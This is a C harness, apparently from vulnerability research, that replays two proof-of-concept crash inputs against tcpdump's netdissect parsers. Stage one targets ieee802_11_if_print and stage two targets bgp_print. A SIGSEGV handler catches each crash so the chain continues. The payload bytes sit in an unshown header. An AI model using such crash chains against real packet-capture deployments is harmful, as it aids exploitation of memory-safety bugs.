/*
 * Runtime chain: bug 049 (ieee802_11_if_print) -> bug 058 (bgp_print).
 * PoCs from SAILOR replay_driver.c for 049 and 058.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>

#include <netdissect-stdinc.h>
#include "netdissect.h"
#include "print.h"

#include "payloads.h"

sigjmp_buf jump_buffer;

static void crash_catcher(int signum) {
    (void)signum;
    printf("\n[+] Hard crash intercepted. Jumping to next bug...\n\n");
    siglongjmp(jump_buffer, 1);
}

int main(void) {
    signal(SIGSEGV, crash_catcher);

    netdissect_options *ndo1 = calloc(1, sizeof(*ndo1));
    ndo_set_function_pointers(ndo1);
    unsigned char *h = calloc(1, 8);
    ((unsigned int *)h)[0] = P_DATA_049_PKTHDR_CAPLEN;
    ((unsigned int *)h)[1] = P_DATA_049_PKTHDR_CAPLEN;

    unsigned char *payload049 = calloc(1, P_DATA_049_PKTHDR_CAPLEN);
    memcpy(payload049, p_data_049, P_DATA_049_LEN);
    ndo1->ndo_snapend = payload049 + P_DATA_049_PKTHDR_CAPLEN;
    ndo1->ndo_packetp = payload049;
    ndo1->ndo_snaplen = P_DATA_049_PKTHDR_CAPLEN;

    if (sigsetjmp(jump_buffer, 1) == 0) {
        printf("[049 -> 058] Stage 1: ieee802_11_if_print\n");
        ieee802_11_if_print(ndo1, (const struct pcap_pkthdr *)h, payload049);
    }

    netdissect_options *ndo2 = calloc(1, sizeof(*ndo2));
    ndo_set_function_pointers(ndo2);
    unsigned char *buf = malloc(P_DATA_058_LEN);
    memcpy(buf, p_data_058, P_DATA_058_LEN);
    ndo2->ndo_vflag = 1;
    ndo2->ndo_snapend = buf + P_DATA_058_LEN;

    if (sigsetjmp(jump_buffer, 1) == 0) {
        printf("[049 -> 058] Stage 2: bgp_print\n");
        bgp_print(ndo2, buf, P_DATA_058_LEN);
    }

    free(buf);
    free(ndo2);
    free(payload049);
    free(h);
    free(ndo1);
    return 0;
}
